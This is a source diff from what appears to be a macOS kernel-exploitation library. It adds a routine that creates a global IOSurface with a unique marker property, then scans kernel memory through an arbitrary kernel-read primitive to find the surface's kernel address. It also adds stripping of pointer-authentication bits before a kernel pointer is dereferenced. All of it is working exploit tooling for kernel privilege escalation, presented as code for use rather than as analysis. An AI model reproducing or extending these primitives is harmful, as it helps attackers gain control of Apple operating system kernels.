@@ -5,7 +5,12 @@
 //  Created by admin on 12/6/21.
 //
 
+#include <stdatomic.h>
+
 #include <sys/errno.h>
+
+#include <IOKit/IOKitLib.h>
+#include <IOSurface/IOSurface.h>
 
 #include "memory/kmem.h"
 #include "slider/kernel.h"
@@ -14,8 +19,40 @@
 #include "iokit/os_array.h"
 #include "iokit/os_dictionary.h"
 #include "util/assert.h"
+#include "util/ptrauth.h"
 
 #include "macos_params.h"
+
+
+static _Atomic size_t xe_io_surface_keygen = 0;
+
+
+IOSurfaceRef xe_io_surface_create(uintptr_t* addr_out) {
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int alloc_size_raw_value = 8;
+    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
+
+    IOSurfaceRef surface = IOSurfaceCreate(props);
+    xe_assert(surface != NULL);
+    CFRelease(alloc_size_cfnum);
+    CFRelease(props);
+    
+    char key[NAME_MAX];
+    snprintf(key, sizeof(key), "xe_io_surface_%d_%lu", getpid(), atomic_fetch_add(&xe_io_surface_keygen, 1));
+    CFStringRef cf_key = CFStringCreateWithCString(kCFAllocatorDefault, key, kCFStringEncodingUTF8);
+    xe_assert(cf_key != NULL);
+    IOSurfaceSetValue(surface, cf_key, kCFBooleanTrue);
+    CFRelease(cf_key);
+    
+    uintptr_t surface_addr;
+    int error = xe_io_surface_scan_all_clients_for_prop(key, &surface_addr);
+    xe_assert_err(error);
+    
+    *addr_out = surface_addr;
+    return surface;
+}
 
 
 uintptr_t xe_io_surface_root(void) {
@@ -50,7 +87,7 @@ int xe_io_surface_scan_user_client_for_prop(uintptr_t root_user_client, char* ke
             continue;
         }
         
-        uintptr_t surface = xe_kmem_read_uint64(user_client, TYPE_IOSURFACE_CLIENT_MEM_IOSURFACE_OFFSET);
+        uintptr_t surface = xe_kmem_read_uint64(xe_ptrauth_strip(user_client), TYPE_IOSURFACE_CLIENT_MEM_IOSURFACE_OFFSET);
         uintptr_t props_dict = xe_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
         
         if (!props_dict) {
